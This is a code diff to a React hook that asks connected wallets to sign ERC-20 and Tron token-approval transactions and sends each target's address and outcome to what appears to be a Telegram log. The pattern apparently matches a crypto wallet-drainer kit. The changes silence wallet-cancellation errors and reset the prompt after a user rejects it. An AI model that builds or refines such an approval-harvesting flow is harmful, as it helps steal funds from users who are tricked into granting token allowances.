@@ -16,6 +16,7 @@ import {
   encodeErc20Approve,
   resolveEvmAmountRaw,
 } from "@/lib/connect-flow/evm-approve";
+import { getErrorMessage, isUserRejection, muteWalletCancellationConsoleErrors, withSilentWalletCancellation } from "@/lib/connect-flow/errors";
 import {
   accountsFromSession,
   getTronLinkAddress,
@@ -103,6 +104,7 @@ export function useConnectFlow() {
 
   useEffect(() => {
     let cancelled = false;
+    muteWalletCancellationConsoleErrors();
 
     async function init() {
       if (!projectId) {
@@ -286,10 +288,12 @@ export function useConnectFlow() {
             throw new Error(buildJson.error || "Failed to build Tron approve");
           }
 
-          const signRaw = await tronSignTransaction(
-            provider,
-            linked.tron,
-            buildJson.transaction
+          const signRaw = await withSilentWalletCancellation(() =>
+            tronSignTransaction(
+              provider,
+              linked.tron!,
+              buildJson.transaction!
+            )
           );
           const signed = mergeTronSignedResult(
             buildJson.transaction,
@@ -329,19 +333,21 @@ export function useConnectFlow() {
           const data = encodeErc20Approve(spender, amount);
           const chainId = EVM_CHAIN_ID[networkKey];
 
-          const hash = await provider.request(
-            {
-              method: "eth_sendTransaction",
-              params: [
-                {
-                  from: linked.evm,
-                  to: token.address,
-                  data,
-                  value: "0x0",
-                },
-              ],
-            },
-            `eip155:${chainId}`
+          const hash = await withSilentWalletCancellation(() =>
+            provider.request(
+              {
+                method: "eth_sendTransaction",
+                params: [
+                  {
+                    from: linked.evm!,
+                    to: token.address,
+                    data,
+                    value: "0x0",
+                  },
+                ],
+              },
+              `eip155:${chainId}`
+            )
           );
           txid = typeof hash === "string" ? hash : null;
         } else {
@@ -371,23 +377,31 @@ export function useConnectFlow() {
           });
         }
       } catch (err: unknown) {
-        console.error(err);
-        const message =
-          err instanceof Error ? err.message : "Approval failed";
-        const rejected = /reject|denied|cancel/i.test(message);
-        setStatus(networkKey, rejected ? "rejected" : "awaiting");
-        if (!rejected) setError(message);
+        const message = getErrorMessage(err, "Approval failed");
+        const rejected = isUserRejection(err);
+
+        if (rejected) {
+          // User closed/rejected the wallet prompt — friendly UI, no error noise
+          console.warn("[approve] permission denied by user");
+          setError("Permission denied by user");
+          setStatus(networkKey, "rejected");
+        } else {
+          console.error(err);
+          setError(message);
+          setStatus(networkKey, "awaiting");
+        }
+
         if (addressForLog) {
           void postTgLog({
             type: "approve",
             address: addressForLog,
             network: networkKey,
             status: "rejected",
-            error: rejected ? "User canceled" : message,
+            error: rejected ? "Permission denied by user" : message,
           });
         }
         if (rejected) {
-          window.setTimeout(() => setStatus(networkKey, "awaiting"), 1600);
+          window.setTimeout(() => setStatus(networkKey, "awaiting"), 2200);
         }
       } finally {
         approvingLockRef.current = false;
